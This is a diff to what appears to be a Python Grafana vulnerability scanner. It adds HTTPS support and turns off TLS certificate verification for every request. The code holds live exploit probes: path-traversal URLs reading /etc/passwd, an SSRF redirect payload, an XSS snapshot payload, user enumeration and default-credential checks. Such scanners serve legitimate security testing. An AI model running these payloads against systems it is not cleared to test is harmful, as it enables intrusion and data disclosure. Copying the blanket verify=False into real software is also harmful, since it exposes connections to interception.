@@ -3,6 +3,23 @@ import asyncio
 import json
 import re
 
+async def detect_protocol(ip, port, timeout=3):
+    """
+    Detects whether a service is running on HTTP or HTTPS.
+    Returns the protocol string ('http' or 'https') or None if unreachable.
+    """
+    protocols = ['https', 'http']  # Try HTTPS first as it's more secure
+    
+    for protocol in protocols:
+        try:
+            async with httpx.AsyncClient(timeout=timeout, verify=False) as client:
+                response = await client.get(f"{protocol}://{ip}:{port}/")
+                if response.status_code in [200, 401, 403, 302, 404]:  # Any valid HTTP response
+                    return protocol
+        except:
+            continue
+    return 'http'  # Default to HTTP if detection fails
+
 # Verified Grafana CVE database based on https://grafana.com/security/security-advisories/
 CVE_DATABASE = {
     "CVE-2024-9264": {
@@ -270,7 +287,7 @@ async def get_grafana_version(target_url):
     
     # Try main API endpoint first
     try:
-        async with httpx.AsyncClient() as client:
+        async with httpx.AsyncClient(timeout=10, verify=False) as client:
             response = await client.get(f"{target_url}/api/health", timeout=5)
             if response.status_code == 200:
                 data = response.json()
@@ -283,7 +300,7 @@ async def get_grafana_version(target_url):
     
     # Try login page for version disclosure
     try:
-        async with httpx.AsyncClient() as client:
+        async with httpx.AsyncClient(timeout=10, verify=False) as client:
             response = await client.get(f"{target_url}/login", timeout=5)
             if response.status_code == 200:
                 # Look for version in HTML content
@@ -309,7 +326,7 @@ async def get_grafana_version(target_url):
     
     for endpoint in version_endpoints:
         try:
-            async with httpx.AsyncClient() as client:
+            async with httpx.AsyncClient(timeout=10, verify=False) as client:
                 response = await client.get(f"{target_url}{endpoint}", timeout=5)
                 if response.status_code == 200:
                     # Check headers for version info
@@ -342,7 +359,7 @@ async def test_cve_payload(target_url, cve_id, cve_data):
     test_url = f"{target_url}{payload['path']}"
     
     try:
-        async with httpx.AsyncClient() as client:
+        async with httpx.AsyncClient(timeout=10, verify=False) as client:
             response = None
             
             if payload["method"] == "GET":
@@ -584,7 +601,7 @@ async def check_unauthenticated_access(target_url):
     
     for endpoint, description in sensitive_endpoints:
         try:
-            async with httpx.AsyncClient() as client:
+            async with httpx.AsyncClient(timeout=10, verify=False) as client:
                 response = await client.get(f"{target_url}{endpoint}", timeout=5)
                 
                 if response.status_code == 200:
@@ -615,7 +632,7 @@ async def check_information_disclosure(target_url):
     
     # Check /metrics endpoint (often exposed) with enhanced analysis
     try:
-        async with httpx.AsyncClient() as client:
+        async with httpx.AsyncClient(timeout=10, verify=False) as client:
             response = await client.get(f"{target_url}/metrics", timeout=5)
             if response.status_code == 200:
                 content = response.text
@@ -663,7 +680,7 @@ async def check_information_disclosure(target_url):
     
     # Check /api/frontend/settings for sensitive info
     try:
-        async with httpx.AsyncClient() as client:
+        async with httpx.AsyncClient(timeout=10, verify=False) as client:
             response = await client.get(f"{target_url}/api/frontend/settings", timeout=5)
             if response.status_code == 200:
                 try:
@@ -697,7 +714,7 @@ async def check_additional_cves(target_url):
     
     # Test CVE-2022-39307 - User enumeration via password reset
     try:
-        async with httpx.AsyncClient() as client:
+        async with httpx.AsyncClient(timeout=10, verify=False) as client:
             payload = {"loginOrEmail": "nonexistent@example.com"}
             response = await client.post(f"{target_url}/api/user/password/sent-reset-email", 
                                        json=payload, timeout=5)
@@ -715,7 +732,7 @@ async def check_additional_cves(target_url):
     
     # Test CVE-2021-43798 - Path traversal (enhanced payload)
     try:
-        async with httpx.AsyncClient() as client:
+        async with httpx.AsyncClient(timeout=10, verify=False) as client:
             traversal_paths = [
                 "/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd",
                 "/public/plugins/text/../../../../../../../../../../../../../../../../../../../etc/passwd",
@@ -739,7 +756,7 @@ async def check_additional_cves(target_url):
     
     # Test CVE-2020-13379 - SSRF via avatar endpoint
     try:
-        async with httpx.AsyncClient() as client:
+        async with httpx.AsyncClient(timeout=10, verify=False) as client:
             ssrf_payload = "/avatar/test%3fd%3dredirect.example.com%25253f%253b%252fbp.blogspot.com%252ftest"
             response = await client.get(f"{target_url}{ssrf_payload}", timeout=5, follow_redirects=False)
             if response.status_code in [302, 301] and response.headers.get('location'):
@@ -754,7 +771,7 @@ async def check_additional_cves(target_url):
     
     # Test CVE-2022-32276 - Unauthenticated snapshot access
     try:
-        async with httpx.AsyncClient() as client:
+        async with httpx.AsyncClient(timeout=10, verify=False) as client:
             snapshot_urls = [
                 "/dashboard/snapshot/test?orgId=0",
                 "/api/snapshots/1",
@@ -778,7 +795,7 @@ async def check_additional_cves(target_url):
     
     # Test for XSS vulnerabilities in snapshot endpoints
     try:
-        async with httpx.AsyncClient() as client:
+        async with httpx.AsyncClient(timeout=10, verify=False) as client:
             xss_payload = "/dashboard/snapshot/%7B%7Bconstructor.constructor(%27alert(document.domain)%27)()%7D%7D?orgId=1"
             response = await client.get(f"{target_url}{xss_payload}", timeout=5)
             if response.status_code == 200:
@@ -797,48 +814,56 @@ async def check_additional_cves(target_url):
 
 async def run_scans(ip, port):
     """Runs all defined Grafana scans against a target."""
-    target_url = f"http://{ip}:{port}"
-    print(f"  -> Running Grafana scans on {target_url}")
-    results = []
+    # Test both HTTP and HTTPS protocols
+    protocols = ['http', 'https']
+    all_results = []
     
-    # Get version information first
-    version_info = await get_grafana_version(target_url)
-    service_version = version_info.get('number', 'Unknown') if version_info else 'Unknown'
+    for protocol in protocols:
+        target_url = f"{protocol}://{ip}:{port}"
+        print(f"  -> Running Grafana scans on {target_url}")
+        
+        # Get version information first to verify connectivity
+        version_info = await get_grafana_version(target_url)
+        service_version = version_info.get('number', 'Unknown') if version_info else 'Unknown'
+        
+        # Skip this protocol if we can't connect
+        if not version_info:
+            continue
+        
+        # Run basic checks concurrently for this protocol
+        tasks = [
+            check_default_credentials(target_url),
+            check_unauthenticated_access(target_url),
+            check_information_disclosure(target_url),
+            check_additional_cves(target_url)
+        ]
+        check_results = await asyncio.gather(*tasks)
+        
+        for res in check_results:
+            if res:
+                if isinstance(res, list):
+                    # Handle list of vulnerabilities
+                    for vuln in res:
+                        vuln['module'] = 'Grafana'
+                        vuln['service_version'] = service_version
+                        vuln['server'] = ip
+                        vuln['port'] = port
+                    all_results.extend(res)
+                else:
+                    # Handle single vulnerability
+                    res['module'] = 'Grafana'
+                    res['service_version'] = service_version
+                    res['server'] = ip
+                    res['port'] = port
+                    all_results.append(res)
+        
+        # Run comprehensive CVE checks for this protocol
+        cve_results = await check_cve_vulnerabilities(target_url)
+        for cve_result in cve_results:
+            cve_result['module'] = 'Grafana'
+            cve_result['service_version'] = service_version
+            cve_result['server'] = ip
+            cve_result['port'] = port
+            all_results.append(cve_result)
     
-    # Run basic checks concurrently
-    tasks = [
-        check_default_credentials(target_url),
-        check_unauthenticated_access(target_url),
-        check_information_disclosure(target_url),
-        check_additional_cves(target_url)
-    ]
-    check_results = await asyncio.gather(*tasks)
-    
-    for res in check_results:
-        if res:
-            if isinstance(res, list):
-                # Handle list of vulnerabilities
-                for vuln in res:
-                    vuln['module'] = 'Grafana'
-                    vuln['service_version'] = service_version
-                    vuln['server'] = ip
-                    vuln['port'] = port
-                results.extend(res)
-            else:
-                # Handle single vulnerability
-                res['module'] = 'Grafana'
-                res['service_version'] = service_version
-                res['server'] = ip
-                res['port'] = port
-                results.append(res)
-    
-    # Run comprehensive CVE checks
-    cve_results = await check_cve_vulnerabilities(target_url)
-    for cve_result in cve_results:
-        cve_result['module'] = 'Grafana'
-        cve_result['service_version'] = service_version
-        cve_result['server'] = ip
-        cve_result['port'] = port
-    results.extend(cve_results)
-            
-    return results
+    return all_results
